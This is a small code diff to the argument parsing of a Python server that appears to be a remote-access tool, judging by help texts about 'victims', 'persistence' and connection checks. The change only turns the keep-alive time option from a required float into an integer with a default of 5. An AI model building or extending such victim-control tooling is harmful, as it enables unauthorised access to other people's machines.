@@ -21,7 +21,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-i","--ip", dest="IP", default="", help="the ip address of the server.")
 parser.add_argument("-p","--port", dest="PORT", required=True, help="the port number of the server.")
 parser.add_argument("-d","--display", action="store_false", default=True, help="disables the display of client information (Logoff and incoming connection).")
-parser.add_argument("-t","--time", dest="TIME", type=float, required=True, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
+parser.add_argument("-t","--time", dest="TIME", default=5, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
 #parser.add_argument("-a","--auto", action="store_true", default=False,help="if the -a or --auto parameter is added then all victims will perform persistence automatically.")
 parser.add_argument("-c","--clean", dest="CLEAN", action="store_true", default=False, help="cleans all the data in the database.")
 try:
@@ -30,7 +30,7 @@ try:
     HOST = str(argv["IP"])
     PORT = int(argv["PORT"])
     DISPLAY = bool(argv["display"])
-    TIME = float(argv["TIME"])
+    TIME = int(argv["TIME"])
     CLEAN = float(argv["CLEAN"])
 
 except SystemExit:
